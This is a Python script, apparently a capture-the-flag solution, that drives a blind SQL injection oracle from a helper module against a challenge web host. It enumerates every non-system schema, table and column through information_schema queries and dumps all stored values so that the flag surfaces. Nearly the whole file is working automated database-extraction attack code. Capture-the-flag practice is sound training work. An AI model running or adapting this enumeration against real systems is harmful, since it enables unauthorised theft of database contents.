#!/usr/bin/env python3
"""Targeted PHAULT extraction: skip system schemas, dump every table/column
value so the flag surfaces fast (full-dump is unbounded)."""
import sys
import time

import solve_phault as sp

HOST = sys.argv[1] if len(sys.argv) > 1 else "04a2b0dcb17c2e99.chal.ctf.ae"
sp.BASE = f"https://{HOST}/"

SYSTEM = {"information_schema", "performance_schema", "mysql", "sys"}


def main() -> None:
    print(f"[+] target {sp.BASE}")
    if not sp.sanity_check():
        print("[!] Oracle dead")
        return
    print("[+] Oracle alive")
    dbs = []
    i = 1
    while True:
        d = sp.dump_string(f"(SELECT schema_name FROM information_schema.schemata LIMIT {i-1},1)")
        if d == "(empty)":
            break
        dbs.append(d)
        i += 1
    print("[dbs]", dbs)
    for db in dbs:
        if db in SYSTEM:
            print(f"[skip] system schema {db}")
            continue
        tables = []
        i = 1
        while True:
            t = sp.dump_string(
                f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i-1},1)")
            if t == "(empty)":
                break
            tables.append(t)
            i += 1
        print("[tables]", db, tables)
        for tbl in tables:
            cols = []
            i = 1
            while True:
                c = sp.dump_string(
                    f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{tbl}' LIMIT {i-1},1)")
                if c == "(empty)":
                    break
                cols.append(c)
                i += 1
            print("[cols]", db, tbl, cols)
            for col in cols:
                vals = []
                i = 1
                while True:
                    v = sp.dump_string(f"(SELECT `{col}` FROM `{db}`.`{tbl}` LIMIT {i-1},1)")
                    if v == "(empty)":
                        break
                    vals.append(v)
                    i += 1
                print("[data]", db, tbl, col, vals)


if __name__ == "__main__":
    main()